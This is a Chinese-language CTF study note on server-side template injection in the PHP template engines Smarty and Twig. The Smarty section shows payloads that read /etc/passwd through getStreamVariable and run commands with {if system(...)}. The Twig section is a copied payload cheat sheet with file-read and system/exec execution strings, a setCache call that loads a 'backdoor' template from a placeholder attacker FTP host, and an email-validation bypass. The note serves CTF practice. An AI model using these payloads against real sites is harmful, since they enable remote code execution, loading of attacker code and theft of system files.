# PHP模板

单独拉flask来说是因为它实在是感觉非常重要，而且是理解运用其他模板的基础（c语言？）


接下来是两个php相关的模板



## smarty

Smarty是一个PHP的模板引擎，提供让程序逻辑与页面显示（HTML/CSS）代码分离的功能。


这个模板好像是有些年头了，碰到的次数也是很少，但比赛可不会管你学没学会不会，所以还


是在这简单的介绍介绍。（我是想拉个例题的，但是没找到）


利用方式：（搬运工


一般情况下输入{$smarty.version}就可以看到返回的smarty的版本号


Smarty支持使用`{php}{/php}`标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。（Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。）


`{literal}`可以让一个模板区域的字符原样输出。 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。


**通过self获取Smarty类再调用其静态方法实现文件读写被网上很多文章采用。**


Smarty类的getStreamVariable方法的代码如下：


```plain
public function getStreamVariable($variable){        $_result = '';        $fp = fopen($variable, 'r+');        if ($fp) {            while (!feof($fp) && ($current_line = fgets($fp)) !== false) {                $_result .= $current_line;            }            fclose($fp);            return $_result;        }        $smarty = isset($this->smarty) ? $this->smarty : $this;        if ($smarty->error_unassigned) {            throw new SmartyException('Undefined stream variable "' . $variable . '"');        } else {            return null;        }    }
Plain Text
```



可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法，很多文章里给的payload都形如：{self::getStreamVariable(“[file:///etc/passwd](file:///etc/passwd)”)}。





Smarty的{if}条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||*, or, &&, and, is_array(), 等等，如：{if is_array($array)}{/if}*那么同样的，在利用的过程中{ifsystem(‘cat \flag’)}{/if},亦或者是{if readfile (‘/flag’)}{/if}


大概就这么点了，对了例题：（自己去搜搜）


CISCN2019华东南赛区Web11


[BJDCTF2020]The mystery of ip

## twig

另外一个php模板，其实有三个，这里只写了两个，剩下的那个实在是没有遇见过


这个也挺少见的（对我来说


所以我更倾向于~~只能~~放一些暴力一点的payload了


```plain
Twig - Basic injection
{{7*7}}
{{7*'7'}} would result in 49
{{dump(app)}}
{{app.request.server.all|join(',')}}
Twig - Template format
$output = $twig > render (
'Dear' . $_GET['custom_greeting'],
array("first_name" => $user.first_name)
);
$output = $twig > render (
"Dear {first_name}",
array("first_name" => $user.first_name)
);
Twig - Arbitrary File Reading
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
Twig - Code execution
{{self}}
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
Example with an email passing FILTER_VALIDATE_EMAIL PHP.
POST /subscribe?0=cat+/etc/passwd HTTP/1.1
email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
嗯是的，没错，就是这样（指白嫖怪）
Plain Text
```



来自github上某位老哥的杰作。













